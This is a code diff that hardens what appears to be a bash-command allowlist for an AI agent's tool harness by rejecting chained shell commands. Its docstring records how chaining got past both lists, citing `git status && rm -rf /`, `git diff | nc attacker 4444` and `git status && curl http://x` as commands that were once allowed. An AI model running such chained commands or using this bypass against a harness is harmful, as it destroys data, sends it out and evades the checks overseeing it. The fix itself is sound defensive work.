@@ -38,6 +38,7 @@ from __future__ import annotations
 import os
 import re
 import secrets
+import shlex
 import shutil
 import subprocess
 from dataclasses import dataclass, field
@@ -373,19 +374,93 @@ def verify_no_path_escape(path: str | Path, workspace_root: str | Path) -> Path:
     return resolved
 
 
+# Shell control operators. A command containing one of these is not one
+# command — it is several, and only the first is what either list inspects.
+_SHELL_OPERATOR_TOKENS: frozenset[str] = frozenset({
+    "&&", "||", ";", ";;", "|", "|&", "&", "\n", "(", ")", "<", ">", ">>", "<<",
+})
+# Command substitution survives shlex tokenization glued to its neighbours, so
+# it is matched as a substring rather than as a token.
+_SHELL_SUBSTITUTION_MARKERS: tuple[str, ...] = ("`", "$(", "${", "$[")
+
+
+def shell_control_operator(argv: list[str] | tuple[str, ...]) -> str | None:
+    """The shell operator that makes this argv more than one command, if any.
+
+    ORPHAN-CRITICAL-460 — the hole every other bash check sat on top of.
+    `verify_bash_command_allowed` joins argv with spaces and matches patterns
+    shaped `^git\\s+status(\\s+\\S+)*\\s*$`. That trailing group matches
+    ANYTHING, including `&&`, so `git status && git push origin main -f`
+    satisfied the allowlist. Every DENY pattern is `^`-anchored on argv-0, so
+    the denylist only ever inspected the first binary and saw `git`. And
+    `_check_no_force_push` reads `argv[:2] == ["git", "push"]`, which an
+    allowed prefix blinds. Measured at the time: `git status && rm -rf /`,
+    `git diff | nc attacker 4444` and `git status && curl http://x` were all
+    ALLOWED, while their unchained forms were correctly refused.
+
+    Tokenized rather than regex-scanned, because the distinction that matters
+    is quoting: `git commit -m 'fix A && B'` contains `&&` as DATA and must
+    still be allowed, while `git status && git push` contains it as an
+    OPERATOR and must not. `shlex` with `punctuation_chars=True` splits
+    operators into their own tokens even when unspaced (`git diff|nc x`) and
+    leaves quoted text intact, which is exactly that distinction.
+
+    A multi-element argv is checked token-by-token: it is passed to
+    `subprocess` as a list, so an operator only has effect if the caller made
+    it its own token. A single-element argv IS a command line and is
+    tokenized. An argv that cannot be lexed at all (unbalanced quotes) is
+    rejected: an unparseable command is not a verified one.
+    """
+    if len(argv) > 1:
+        for raw in argv:
+            token = str(raw)
+            if token in _SHELL_OPERATOR_TOKENS:
+                return token
+            for marker in _SHELL_SUBSTITUTION_MARKERS:
+                if marker in token:
+                    return marker
+        return None
+
+    line = str(argv[0]) if argv else ""
+    for marker in _SHELL_SUBSTITUTION_MARKERS:
+        if marker in line:
+            return marker
+    lexer = shlex.shlex(line, posix=True, punctuation_chars=True)
+    lexer.whitespace_split = True
+    try:
+        tokens = list(lexer)
+    except ValueError:
+        return "unlexable_command"
+    for token in tokens:
+        if token in _SHELL_OPERATOR_TOKENS:
+            return token
+    return None
+
+
 def verify_bash_command_allowed(argv: list[str], *, cwd: str | Path | None = None) -> None:
     """Hard-fail check 8 — Bash allowlist (NOT blocklist).
 
     Joins argv with spaces, tests against:
+      0. shell control operators — any hit → BashDenylistHit
       1. DENIED_BASH_COMMANDS — any hit → BashDenylistHit
       2. ALLOWED_BASH_COMMANDS — at least one MUST match → otherwise
          BashAllowlistMiss
 
-    Order: deny first, then allow. A command matching both is
-    rejected (deny wins).
+    Order: chaining first, then deny, then allow. Chaining has to come first
+    because both lists reason about a SINGLE command, and a chained argv is
+    several — see :func:`shell_control_operator` (ORPHAN-CRITICAL-460).
+    A command matching both deny and allow is rejected (deny wins).
     """
     if not isinstance(argv, (list, tuple)) or not argv:
         raise BashAllowlistMiss(f"argv must be a non-empty list, got {argv!r}")
+    operator = shell_control_operator(argv)
+    if operator is not None:
+        raise BashDenylistHit(
+            f"shell_control_operator_in_command: {operator!r} — argv must be one "
+            f"command. Both the allow and deny lists inspect only the first "
+            f"binary, so a chained command bypasses every one of them. "
+            f"argv0={argv[0]!r}"
+        )
     line = " ".join(str(a) for a in argv)
     for denied in DENIED_BASH_COMMANDS:
         if denied.search(line):
